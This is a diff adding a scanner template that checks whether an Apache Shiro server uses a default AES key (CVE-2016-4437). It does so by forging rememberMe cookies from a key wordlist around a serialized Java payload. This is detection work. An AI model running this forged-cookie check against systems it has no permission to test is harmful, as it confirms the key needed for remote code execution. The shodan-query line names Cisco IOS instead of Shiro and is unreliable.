@@ -1,0 +1,40 @@
+## id: shiro-default-key
+## name: Apache Shiro Default Key Detection
+## author: hack007x
+## severity: critical
+## tags: shiro,key
+## description: 检测目标是否使用 Apache Shiro 框架并且使用了默认的 AES 密钥。攻击者可利用默认密钥伪造 rememberMe Cookie，实现反序列化 RCE。
+## tags: shiro,deserialization,rce,java
+## affects: Apache Shiro (使用默认/弱 AES 密钥的所有版本)
+## reference: https://issues.apache.org/jira/browse/SHIRO-550
+## reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437
+## cve: CVE-2016-4437
+## cvss-score: 9.8
+## shodan-query: product:"Cisco IOS http config" && 200
+## verification: true
+
+
+
+#$ shiro_payload = rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==
+#$ key = @file(wordlists/shiro_key.txt)
+
+GET / HTTP/1.1
+Cookie: rememberMe=veil_invalid_token
+User-Agent: {{random_ua}}
+
+#@ matcher: header["Set-Cookie"] contains "rememberMe=deleteMe"
+
+---
+
+GET / HTTP/1.1
+Cookie: rememberMe={{shiro_cookie({{key}}, {{shiro_payload}})}}
+User-Agent: {{random_ua}}
+
+#@ matcher: header["Set-Cookie"] not_contains "rememberMe=deleteMe"
+#@ stop_scan: true
+
+
+
+
+
+# @VEIL-STAMP: c78a2901d470d59cdec30e29a94bb427d7a4bc9e237a9522c785b1639ceff140
